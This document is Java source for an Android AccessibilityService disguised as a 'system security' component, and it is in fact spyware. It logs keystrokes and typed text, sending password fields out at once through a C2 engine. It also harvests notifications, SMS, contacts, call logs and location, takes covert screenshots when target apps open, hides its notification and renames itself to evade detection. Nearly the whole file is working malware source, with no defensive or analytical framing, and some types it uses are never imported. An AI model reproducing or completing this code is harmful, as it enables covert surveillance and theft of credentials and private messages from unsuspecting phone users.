package com.android.system.security;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.util.Log;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.ByteArrayOutputStream;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Core AccessibilityService — receives all window events, key events, 
 * and has system-level privileges for screen capture and input monitoring.
 */
public class CoreService extends AccessibilityService {

    private static final String TAG = "SysSecSvc";
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "system_security_channel";

    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private final AtomicBoolean isRunning = new AtomicBoolean(false);

    // Event buffer for keylogging
    private final ConcurrentLinkedQueue<KeyEvent> keyBuffer = new ConcurrentLinkedQueue<>();
    private final ConcurrentLinkedQueue<String> windowBuffer = new ConcurrentLinkedQueue<>();

    // C2 Engine
    private C2Engine c2Engine;

    // Data collector
    private DataCollector dataCollector;

    // Encrypted store
    private EncryptedStore encryptedStore;

    // Stealth manager
    private StealthManager stealthManager;

    // Persistence
    private PersistenceManager persistenceManager;

    // Current app tracking
    private String currentPackage = "";
    private String currentActivity = "";

    // Window content cache for screenshot analysis
    private final Map<Integer, String> windowCache = new HashMap<>();

    // Timer for periodic tasks
    private Timer scheduler;

    @Override
    public void onCreate() {
        super.onCreate();

        // Start background thread for non-UI work
        backgroundThread = new HandlerThread("SecurityWorker");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());

        // Initialize components
        encryptedStore = new EncryptedStore(this);
        stealthManager = new StealthManager(this);
        c2Engine = new C2Engine(this, encryptedStore);
        dataCollector = new DataCollector(this, encryptedStore, c2Engine);
        persistenceManager = new PersistenceManager(this);

        // Set up foreground notification (required for Android 14+)
        setupForegroundNotification();

        // Start in background
        isRunning.set(true);

        // Start scheduler
        startScheduler();

        Log.i(TAG, "CoreService initialized");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!isRunning.get()) return;

        // Check resource thresholds first (stealth)
        if (!stealthManager.checkResourceThresholds()) {
            return;
        }

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                handleWindowChange(event);
                break;

            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChange(event);
                break;

            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                handleViewClick(event);
                break;

            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                handleTextSelection(event);
                break;

            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                handleScroll(event);
                break;

            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                handleFocus(event);
                break;

            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                handleNotification(event);
                break;

            case AccessibilityEvent.TYPE_GESTURE_DETECTION_END:
                handleGesture(event);
                break;

            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                handleContentChanged(event);
                break;
        }
    }

    @Override
    public void onInterrupt() {
        Log.i(TAG, "Service interrupted");
    }

    @Override
    public void onDestroy() {
        isRunning.set(false);
        if (scheduler != null) {
            scheduler.cancel();
        }
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
        }
        super.onDestroy();
    }

    @Override
    public boolean onKeyEvent(android.view.KeyEvent event) {
        if (!isRunning.get()) return false;

        // Keylogging via onKeyEvent (available when flagRequestFilterKeyEvents is set)
        KeyEvent ke = new KeyEvent(
            event.getKeyCode(),
            event.getUnicodeChar(),
            event.getAction(),
            event.getMetaState(),
            currentPackage,
            currentActivity,
            System.currentTimeMillis()
        );
        keyBuffer.offer(ke);

        // Flush buffer periodically
        if (keyBuffer.size() >= 25) {
            flushKeyBuffer();
        }

        // Always return false to not consume the event (stealth)
        return false;
    }

    // ============================================================
    // EVENT HANDLERS
    // ============================================================

    private void handleWindowChange(AccessibilityEvent event) {
        String prevPackage = currentPackage;
        currentPackage = event.getPackageName() != null ? event.getPackageName().toString() : "";
        currentActivity = event.getClassName() != null ? event.getClassName().toString() : "";

        // Log window change
        if (!currentPackage.equals(prevPackage)) {
            windowBuffer.offer(String.format(
                Locale.US, "APP_SWITCH:%s|%s|%d",
                currentPackage, currentActivity, System.currentTimeMillis()
            ));

            // If target app opened, increase collection intensity
            if (DataCollector.isTargetApp(currentPackage)) {
                dataCollector.triggerTargetAppCollection(currentPackage);
            }

            // Take screenshot on sensitive app launch
            if (DataCollector.isTargetApp(currentPackage)) {
                takeStealthScreenshot();
            }
        }
    }

    private void handleTextChange(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            try {
                CharSequence text = source.getText();
                if (text != null && text.length() > 0) {
                    // Get view metadata
                    String viewId = source.getViewIdResourceName() != null ? 
                        source.getViewIdResourceName() : "unknown";
                    String hint = source.getHintText() != null ? 
                        source.getHintText().toString() : "";

                    // Check if this is a password field
                    boolean isPassword = false;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        isPassword = source.isPassword();
                    }

                    Map<String, Object> entry = new HashMap<>();
                    entry.put("type", "text_input");
                    entry.put("app", currentPackage);
                    entry.put("activity", currentActivity);
                    entry.put("view_id", viewId);
                    entry.put("hint", hint);
                    entry.put("text", text.toString());
                    entry.put("length", text.length());
                    entry.put("is_password", isPassword);
                    entry.put("timestamp", System.currentTimeMillis());

                    encryptedStore.store("keystrokes", entry);

                    // Quick exfil if high-value (password field)
                    if (isPassword || text.length() > 100) {
                        c2Engine.quickExfil(entry);
                    }
                }
            } finally {
                source.recycle();
            }
        }
    }

    private void handleViewClick(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            try {
                Map<String, Object> entry = new HashMap<>();
                entry.put("type", "click");
                entry.put("app", currentPackage);
                entry.put("activity", currentActivity);
                entry.put("view_id", source.getViewIdResourceName());
                entry.put("text", source.getText() != null ? source.getText().toString() : "");
                entry.put("timestamp", System.currentTimeMillis());

                encryptedStore.store("clicks", entry);
            } finally {
                source.recycle();
            }
        }
    }

    private void handleTextSelection(AccessibilityEvent event) {
        Map<String, Object> entry = new HashMap<>();
        entry.put("type", "text_selection");
        entry.put("app", currentPackage);
        entry.put("from", event.getFromIndex());
        entry.put("to", event.getToIndex());
        entry.put("item_count", event.getItemCount());
        entry.put("timestamp", System.currentTimeMillis());

        encryptedStore.store("selections", entry);
    }

    private void handleScroll(AccessibilityEvent event) {
        // Track scrolling for pattern analysis
        Map<String, Object> entry = new HashMap<>();
        entry.put("type", "scroll");
        entry.put("app", currentPackage);
        entry.put("scroll_x", event.getScrollX());
        entry.put("scroll_y", event.getScrollY());
        entry.put("max_x", event.getMaxScrollX());
        entry.put("max_y", event.getMaxScrollY());
        entry.put("timestamp", System.currentTimeMillis());

        // Only store periodically, not every scroll event
        if (System.currentTimeMillis() % 10 == 0) {
            encryptedStore.store("scrolls", entry);
        }
    }

    private void handleFocus(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            try {
                Map<String, Object> entry = new HashMap<>();
                entry.put("type", "focus_change");
                entry.put("app", currentPackage);
                entry.put("view_id", source.getViewIdResourceName());
                entry.put("text", source.getText() != null ? source.getText().toString() : "");
                entry.put("focused", event.isEnabled());
                entry.put("timestamp", System.currentTimeMillis());

                encryptedStore.store("focus", entry);
            } finally {
                source.recycle();
            }
        }
    }

    private void handleNotification(AccessibilityEvent event) {
        Parcelable data = event.getParcelableData();
        if (data instanceof Notification) {
            Notification notif = (Notification) data;
            Map<String, Object> entry = new HashMap<>();
            entry.put("type", "notification");
            entry.put("app", currentPackage);
            entry.put("title", notif.extras.getString(Notification.EXTRA_TITLE, ""));
            entry.put("text", notif.extras.getString(Notification.EXTRA_TEXT, ""));
            entry.put("sub_text", notif.extras.getString(Notification.EXTRA_SUB_TEXT, ""));
            entry.put("timestamp", System.currentTimeMillis());
            entry.put("priority", notif.priority);

            encryptedStore.store("notifications", entry);

            // Instant exfil for messaging apps
            if (DataCollector.isTargetApp(currentPackage)) {
                c2Engine.quickExfil(entry);
            }
        }
    }

    private void handleGesture(AccessibilityEvent event) {
        // Track gesture patterns
        Map<String, Object> entry = new HashMap<>();
        entry.put("type", "gesture");
        entry.put("app", currentPackage);
        entry.put("timestamp", System.currentTimeMillis());
        encryptedStore.store("gestures", entry);
    }

    private void handleContentChanged(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            try {
                if (source.getText() != null && source.getText().length() > 0) {
                    Map<String, Object> entry = new HashMap<>();
                    entry.put("type", "content_change");
                    entry.put("app", currentPackage);
                    entry.put("view_id", source.getViewIdResourceName());
                    entry.put("text", source.getText().toString());
                    entry.put("timestamp", System.currentTimeMillis());
                    encryptedStore.store("content", entry);
                }
            } finally {
                source.recycle();
            }
        }
    }

    // ============================================================
    // KEY BUFFER FLUSH
    // ============================================================

    private void flushKeyBuffer() {
        List<KeyEvent> batch = new ArrayList<>();
        KeyEvent event;
        while ((event = keyBuffer.poll()) != null && batch.size() < 50) {
            batch.add(event);
        }

        if (!batch.isEmpty()) {
            Map<String, Object> entry = new HashMap<>();
            entry.put("type", "key_batch");
            entry.put("app", currentPackage);
            entry.put("count", batch.size());
            entry.put("events", batch);
            entry.put("timestamp", System.currentTimeMillis());

            encryptedStore.store("keystrokes", entry);
        }
    }

    // ============================================================
    // STEALTH SCREENSHOT
    // ============================================================

    private void takeStealthScreenshot() {
        backgroundHandler.post(() -> {
            try {
                // Use AccessibilityService.screenshot API (API 34+)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    ScreenshotResult result = takeScreenshot(
                        Display.DEFAULT_DISPLAY,
                        new Executor() {
                            @Override
                            public void execute(Runnable command) {
                                command.run();
                            }
                        },
                        screenshotResult -> {
                            if (screenshotResult != null && screenshotResult.getBitmap() != null) {
                                Bitmap bitmap = screenshotResult.getBitmap();
                                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                                bitmap.compress(Bitmap.CompressFormat.PNG, 85, baos);
                                byte[] imageData = baos.toByteArray();

                                Map<String, Object> entry = new HashMap<>();
                                entry.put("type", "screenshot");
                                entry.put("app", currentPackage);
                                entry.put("activity", currentActivity);
                                entry.put("size", imageData.length);
                                entry.put("timestamp", System.currentTimeMillis());
                                entry.put("image_data", imageData);

                                encryptedStore.store("screenshots", entry);
                                bitmap.recycle();

                                Log.i(TAG, "Screenshot captured: " + imageData.length + " bytes");
                            }
                        }
                    );
                }
            } catch (Exception e) {
                Log.w(TAG, "Screenshot failed: " + e.getMessage());
            }
        });
    }

    // ============================================================
    // FOREGROUND NOTIFICATION
    // ============================================================

    private void setupForegroundNotification() {
        NotificationChannel channel = new NotificationChannel(
            CHANNEL_ID,
            getString(R.string.notification_channel_name),
            NotificationManager.IMPORTANCE_MIN
        );
        channel.setDescription(getString(R.string.notification_channel_desc));
        channel.setShowBadge(false);
        channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);

        NotificationManager nm = getSystemService(NotificationManager.class);
        nm.createNotificationChannel(channel);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.notification_text))
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setShowWhen(false)
            .build();

        startForeground(NOTIFICATION_ID, notification);
    }

    // ============================================================
    // SCHEDULER
    // ============================================================

    private void startScheduler() {
        scheduler = new Timer("SecurityScheduler", true);

        // Data collection tasks
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isRunning.get() && stealthManager.checkResourceThresholds()) {
                    backgroundHandler.post(() -> dataCollector.collectDeviceInfo());
                }
            }
        }, 5000, Config.LOCATION_INTERVAL_MS);

        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isRunning.get() && stealthManager.checkResourceThresholds()) {
                    backgroundHandler.post(() -> {
                        dataCollector.collectContacts();
                        dataCollector.collectSMS();
                        dataCollector.collectCallLogs();
                    });
                }
            }
        }, 15000, Config.CONTACTS_INTERVAL_MS);

        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isRunning.get() && stealthManager.checkResourceThresholds()) {
                    backgroundHandler.post(dataCollector::collectLocation);
                }
            }
        }, 10000, Config.LOCATION_INTERVAL_MS);

        // Key buffer flush
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                flushKeyBuffer();
            }
        }, 30000, 30000);

        // C2 beacon
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isRunning.get() && stealthManager.checkResourceThresholds()) {
                    backgroundHandler.post(() -> c2Engine.beacon());
                }
            }
        }, 10000, Config.BEACON_INTERVAL_MS);

        // Polymorphic rename
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isRunning.get()) {
                    backgroundHandler.post(() -> stealthManager.polymorphicRename());
                }
            }
        }, Config.POLYMORPHIC_INTERVAL_MS, Config.POLYMORPHIC_INTERVAL_MS);

        // Stealth environment check
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isRunning.get()) {
                    backgroundHandler.post(() -> {
                        if (stealthManager.isDangerousEnvironment()) {
                            isRunning.set(false);
                        }
                    });
                }
            }
        }, 60000, 60000);
    }

    // ============================================================
    // INNER CLASS: KeyEvent
    // ============================================================

    public static class KeyEvent {
        public final int keyCode;
        public final int unicodeChar;
        public final int action;
        public final int metaState;
        public final String packageName;
        public final String activityName;
        public final long timestamp;

        public KeyEvent(int keyCode, int unicodeChar, int action, int metaState,
                       String packageName, String activityName, long timestamp) {
            this.keyCode = keyCode;
            this.unicodeChar = unicodeChar;
            this.action = action;
            this.metaState = metaState;
            this.packageName = packageName;
            this.activityName = activityName;
            this.timestamp = timestamp;
        }

        public char getChar() {
            return (char) unicodeChar;
        }

        public boolean isPress() {
            return action == android.view.KeyEvent.ACTION_DOWN;
        }

        public String describe() {
            if (unicodeChar > 0 && Character.isDefined(unicodeChar)) {
                return String.valueOf((char) unicodeChar);
            }
            return android.view.KeyEvent.keyCodeToString(keyCode);
        }
    }
  }
